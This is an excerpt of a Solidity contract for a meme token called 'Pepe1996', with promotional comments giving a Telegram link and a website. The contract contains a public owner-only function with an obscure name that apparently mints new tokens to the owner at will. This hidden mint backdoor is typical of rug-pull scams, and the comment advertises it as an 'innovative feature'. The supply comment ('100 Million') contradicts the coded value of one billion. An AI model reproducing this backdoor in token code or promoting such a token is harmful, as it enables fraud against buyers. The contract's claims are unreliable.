...
//
// $Pepe1996 proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/+te8-3mepmw4wYWQ1
//  📱Website ::https://pepe1996.space/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Pepe1996(uint256 amount) public onlyOwner {
 _Pepe1996(msg.sender, amount);
    }
    ...
    function _Pepe1996(address account, uint256 amount) internal virtual {
...
contract Pepe1996 is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Pepe 1996", "Pepe1996") {
     _Pepe1996(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}